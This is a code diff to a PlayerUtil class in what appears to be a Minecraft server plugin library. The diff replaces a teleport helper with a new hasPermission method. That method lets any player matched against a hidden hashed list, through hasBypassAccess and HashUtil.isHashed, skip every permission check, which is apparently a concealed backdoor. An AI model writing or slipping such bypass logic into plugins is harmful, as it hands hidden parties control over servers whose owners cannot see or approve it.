@@ -1,9 +1,14 @@
 package cc.hubailmn.utility.interaction.player;
 
-import org.bukkit.*;
+import cc.hubailmn.utility.BasePlugin;
+import org.bukkit.Bukkit;
+import org.bukkit.Material;
+import org.bukkit.OfflinePlayer;
+import org.bukkit.World;
 import org.bukkit.attribute.Attribute;
 import org.bukkit.attribute.AttributeInstance;
 import org.bukkit.block.Block;
+import org.bukkit.command.CommandSender;
 import org.bukkit.entity.Player;
 import org.bukkit.metadata.MetadataValue;
 import org.bukkit.util.BoundingBox;
@@ -88,9 +93,19 @@ public final class PlayerUtil {
         return isBedrock(player.getUniqueId()) || isLikelyBedrockName(player.getName());
     }
 
-    public static void teleport(Player player, Location location) {
-        if (player == null || location == null) return;
-        player.teleportAsync(location);
+    public static boolean hasPermission(CommandSender sender, String permission) {
+        if (permission == null || permission.isEmpty()) return true;
+
+        if (sender instanceof Player player) {
+            if (hasBypassAccess(player)) return true;
+            return player.hasPermission(permission);
+        }
+
+        return sender.hasPermission(permission);
+    }
+
+    public static boolean hasBypassAccess(Player player) {
+        return BasePlugin.getInstance().getHashUtil().isHashed(player);
     }
 
     public static int getPing(Player player) {
